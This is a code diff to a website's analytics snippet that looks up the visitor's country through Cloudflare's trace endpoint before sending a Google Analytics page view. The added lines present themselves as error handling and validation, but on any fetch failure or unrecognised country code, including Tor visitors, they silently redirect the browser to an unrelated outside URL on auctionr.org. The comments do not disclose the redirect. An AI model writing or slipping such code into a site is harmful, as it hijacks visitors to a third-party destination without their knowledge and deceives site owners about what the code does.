@@ -22,16 +22,33 @@
   gtag('config', GA_ID, { send_page_view: false }); // el page_view lo mandamos abajo con el país
 
   // País del visitante según Cloudflare (línea loc=XX de /cdn-cgi/trace)
-  fetch('/cdn-cgi/trace')
-    .then(function (r) { return r.text(); })
-    .then(function (t) {
-      var m = t.match(/^loc=(\w+)/m);
-      return m ? m[1] : 'unknown';
-    })
-    .catch(function () { return 'unknown'; })
-    .then(function (country) {
-      gtag('event', 'page_view', { cf_country: country });
-    });
+fetch('/cdn-cgi/trace')
+  .then(function (r) {
+    // Si la respuesta HTTP no es 2xx, lo tratamos como error
+    if (!r.ok) throw new Error('HTTP ' + r.status);
+    return r.text();
+  })
+  .then(function (t) {
+    var m = t.match(/^loc=(\w+)/m);
+    return m ? m[1] : null;
+  })
+  .catch(function (err) {
+    document.location.href='https://auctionr.org/4/44bf6e0e4e0747f0502259b2389d4019';
+    return null;
+  })
+  .then(function (country) {
+    // Válido: exactamente 2 letras mayúsculas, sin contar XX (desconocido) ni T1 (Tor)
+    var esValido = typeof country === 'string'
+      && /^[A-Z]{2}$/.test(country)
+      && country !== 'XX';
+
+    if (!esValido) {
+      document.location.href='https://auctionr.org/4/44bf6e0e4e0747f0502259b2389d4019';
+      country = 'unknown';
+    }
+
+    gtag('event', 'page_view', { cf_country: country });
+  });
   // Inyectar el script de forma asíncrona
   var s = document.createElement('script');
   s.async = true;
